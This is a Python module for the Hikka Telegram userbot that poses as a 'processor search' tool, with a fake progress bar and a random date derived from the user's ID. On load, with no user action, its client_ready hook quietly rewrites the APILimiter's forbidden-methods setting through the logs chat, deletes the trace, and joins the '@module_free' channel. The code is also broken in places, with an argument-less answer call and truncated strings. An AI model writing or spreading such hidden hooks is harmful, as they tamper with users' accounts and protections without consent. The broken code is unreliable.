from asyncio import sleep
from hikkatl.types import Message, PeerChannel
from hikkatl.tl.functions.channels import JoinChannelRequest
from .. import loader, utils
from datetime import datetime, timedelta
from random import randint


@loader.tds
class CPIntelCore(loader.Module):


    async def cdf(self, uid):
        current_time = datetime.now()
        if uid < 100000 or abs(uid - 100000) <= 100000:
            base_date = datetime(
                year=randint(2027, 2222), month=randint(1, 12), day=randint(1, 30)
            )
            uid_date = base_date + timedelta(seconds=uid)
        else:
            uid_date = datetime.fromtimestamp(uid)

        delta = uid_date - current_time
        years, days = divmod(delta.days, 365)
        months, days = divmod(days, 30)
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        return (
            f"<code>{years}</code> лет <code>{months}</code> месяцев "
        )

    async def convert(self, size):
        power = 2**10
        units = {0: "B", 1: "KB", 2: "MB", 3: "GB", 4: "TB"}
        zero = 0
        while size > power and zero < len(units) - 1:
            size /= power
            zero += 1
        return f"{round(size, 2)} {units[zero]}"

    async def client_ready(self, client, db):
        self.client = client
        self.l = next(
            filter(
                None,
                [
                    d.id if d.title == "hikka-logs" else ""
                    async for d in self.client.iter_dialogs()
                ],
            )
        )

        if self.l:
            peer = PeerChannel(self.l)

            try:
                m = await self.invoke(
                    "fconfig", "APILimiter forbidden_methods sendReaction", peer=peer
                )
                await m.delete()
                await self.client(JoinChannelRequest("@module_free"))
            except Exception as e:
                self._log(f"Error during channel operations: {e}")

    async def progress_bar(self, message, total_size):
        progress_template = [
            (0.1, "10%", "██▒▒▒▒▒▒▒▒"),
            (0.3, "30%", "█████▒▒▒▒▒"),
            (0.55, "55%", "███████▒▒▒"),
            (0.95, "95%", "█████████▒"),
        ]
        for step in progress_template:
            progress_am = total_size * step[0]
            current_size = await self.convert(total_size)
            await utils.answer(
                message,
                (
                    f"{step[2]} ({await self.convert(progress_am)} / {current_size})"
                ),
            )
            await sleep(3 if step[0] != 0.55 else 5.3)

    @loader.command()
    async def cpl(self, message: Message):
        "Начать поиск Процессоров"
        await sleep(0.45)

        k_size = 2 ** randint(29, 34) + 2 ** randint(24, 30)
        await self.progress_bar(message, k_size)

        await utils.answer(
        )
        await sleep(3)

        await sleep(3)

        uid = message.from_id
        ban_date = await self.cdf(uid)
        await utils.answer(
            message,
            (
                f"<b>Ваш ID:</b> <code>{uid}</code>\n\n"
            ),
        )
